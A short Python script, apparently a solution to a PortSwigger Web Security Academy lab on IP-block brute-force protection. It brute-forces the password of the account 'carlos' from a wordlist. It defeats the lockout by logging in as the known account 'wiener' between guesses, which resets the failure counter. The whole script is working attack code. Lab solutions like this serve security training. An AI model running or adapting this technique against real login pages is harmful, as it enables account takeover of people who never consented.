"""
https://portswigger.net/web-security/authentication/password-based/lab-broken-bruteforce-protection-ip-block
"""

import requests
import sys
from bs4 import BeautifulSoup

s = requests.Session()
site = sys.argv[1]
if 'https://' in site:
    site = site.rstrip('/').lstrip('https://')

login_url = f'''https://{site}/login'''
passwords = open("auth-passwords","r").readlines()

def login_wiener():
    logindata = {
        'username' : 'wiener',
        'password' : 'peter'
    }
    resp = s.post(login_url, data=logindata)

for passw in passwords:
    target = passw.strip()
    logindata = {
        'username' : 'carlos',
        'password' : target
    }
    resp = s.post(login_url, data=logindata)
    soup = BeautifulSoup(resp.text,'html.parser')
    if not soup.find('p', {'class':'is-warning'}):
        print(f'password is {target}')
        break
    else:
        login_wiener()